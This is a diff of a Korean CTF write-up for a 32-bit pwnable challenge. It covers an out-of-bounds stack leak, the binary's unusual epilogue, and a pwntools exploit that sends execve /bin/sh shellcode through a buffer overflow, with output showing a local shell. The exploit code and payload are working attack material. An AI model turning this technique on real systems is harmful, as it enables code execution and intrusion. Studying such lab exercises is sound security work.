@@ -121,7 +121,7 @@ int main(void){
 full relro라 got overwrite같은 공격은 힘들 것 같고
 스택에서 코드 실행이 가능하므로 쉘코드를 넣을 예정임
 특이한 점은 RWX라는게 있는데, 읽기, 쓰기, 실행 권한이 모두 설정된 메모리 세그먼트가 있다는 것을 나타낸다고 함 
-아마 이것도 공격 백터 중 하나일 것 같지만 아직까지는 잘 모르겠음
+아마 이것도 공격 백터 중 하나로 사용할 수 있을 것 같긴 한데, 잘 모르겠음음
 
 
 초기화하기 전에 배열의 요소들을 출력할 수 있는데,
@@ -287,19 +287,31 @@ pwndbg> telescope $esp-40 50
 ...
 ```
 
+이렇게 런타임 중에 메모리에 적재된 데이터들의 위치를 확인하여 5번 매뉴에서 SBO를 할 수 있게 만들어야 함
+여러 번 분석해보니 전체적으로 크게 스택에 있는 데이터가 변하지 않아 0xffffcf34에 해당하는 값을 leak할 수 있음
+
 ---
 
-이렇게 런타임 중에 메모리에 적재된 데이터들의 위치를 확인하여 5번 매뉴에서 SBO를 할 수 있게 만들어야 함
-여러 번 분석해보니 전체적으로 크게 스택에 있는 데이터가 변하지 않아 0xffffcf34에 해당하는 값을 leak하여 exploit 코드를 작성해 봤음
+
+이 문제는 에필로그가 상당히 독특한데, esp에 `[ebp-0x8]`, pop 3번 esp에 `[ecx-0x4]`를 넣는 과정이 있음
+그런데 esp(`[ecx-0x4]`)에는 쉘코드의 시작 주소가 담겨 있어야 하고, 가장 마지막 read를 할 때 쉘코드 시작 주소가 필요하므로 payload에 두번의 쉘코드 시작 주소가 담기게 됨
+```sh
+0x00001569 <+541>:	lea    esp,[ebp-0x8]
+0x0000156c <+544>:	pop    ecx
+0x0000156d <+545>:	pop    ebx
+0x0000156e <+546>:	pop    ebp
+0x0000156f <+547>:	lea    esp,[ecx-0x4]
+0x00001572 <+550>:	ret   
+```
 
 
-# exploit(실패)
+
+# exploit
 ```python
 from pwn import *
 
-p=gdb.debug('./easypwn')
-#p=process('./easypwn')
-libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+#sp=gdb.debug('./easypwn')
+p=process('./easypwn')
 e=ELF('./easypwn')
 context.log_level='DEBUG'
 
@@ -313,6 +325,7 @@ p.recvuntil('know\n')
 p.sendline(b'-5')	#esp+0xc
 p.recvuntil('= ')
 stack_shellcode_entry=(int(p.recvline())-4+0x5c)&0xFFFFFFFF	
+print(stack_shellcode_entry)
 
 #stage2
 p.recvuntil('5: exit')
@@ -320,12 +333,49 @@ p.sendline(b'5')
 p.recvuntil('have\n')
 
 payload=b''
-payload+=shellcode
-payload+=b'a'*(0x68-len(payload))
+payload+=p32(stack_shellcode_entry)
+payload+=shellcode.ljust(0x64,b'a')
 payload+=p32(stack_shellcode_entry)
 
 p.sendline(payload)
 p.interactive()
 ```
 
-~~기존에 알고있던 x86 아키택쳐의 에필로그와는 사뭇 달랐음 조금 더 분석을 해봐야 할 듯..~~
+아래 부분에서 ljust()를 사용하는 부분이 있는데, 이상하게도 rjust로 해도 동일한 결과를 만들어냄 
+처음에는 `b'a'`가 아닌 `b'\x90'`로 [[NOP sled]]를 해보고 싶었던 것이었는데, 실수로 a를 넣고 했는데도 이런 현상이 나옴
+이유는 잘 모르겠음
+```python
+payload+=shellcode.ljust(0x64,b'a')
+```
+
+# 실행 결과
+```sh
+┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/easyoob]
+└─$ python3 exploit.py 
+[+] Starting local process './easypwn': pid 28432
+[*] '/home/foo1/Desktop/kknock/pwnable/easyoob/easypwn'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      PIE enabled
+    Stack:    Executable
+    RWX:      Has RWX segments
+/home/foo1/Desktop/kknock/pwnable/easyoob/exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+...
+    00000000  9c ac c7 ff  31 c0 50 68  2f 2f 73 68  68 2f 62 69  │····│1·Ph│//sh│h/bi│
+    00000010  6e 89 e3 50  53 89 e1 31  d2 b0 0b cd  80 61 61 61  │n··P│S··1│····│·aaa│
+    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000060  61 61 61 61  61 61 61 61  9c ac c7 ff  0a           │aaaa│aaaa│····│·│
+    0000006d
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x43 bytes:
+    b'easyoob.zip  easypwn  exploit.py  hosukexploit.py  main.c  test.py\n'
+easyoob.zip  easypwn  exploit.py  hosukexploit.py  main.c  test.py
+$  
+
+```
